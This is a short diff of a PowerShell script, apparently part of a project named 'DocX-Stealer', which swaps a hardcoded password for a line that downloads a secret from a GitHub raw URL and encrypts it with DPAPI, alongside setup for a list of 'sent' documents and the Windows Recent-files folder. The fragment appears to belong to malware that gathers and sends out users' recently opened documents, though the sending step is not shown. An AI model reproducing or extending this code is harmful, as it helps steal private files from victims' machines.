@@ -2,7 +2,9 @@ Add-Type -AssemblyName System.Security
 
 
 ##### GLOBAL #####
-$ContentX = "Pa$$w0rd"
+$Content = (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/niro095/DocX-Stealer/master/Secret')
+[string[]]$Bytes = $Content.Split("`n")
+$ContentX = [Security.Cryptography.ProtectedData]::Protect($Bytes, $Null, [Security.Cryptography.DataProtectionScope]::LocalMachine)
 $docsSent =  New-Object Collections.Generic.List[String]
 $appData = [Environment]::GetFolderPath('ApplicationData') + "\Microsoft\Windows\Recent"
 $temp = [Environment]::GetFolderPath('ApplicationData')
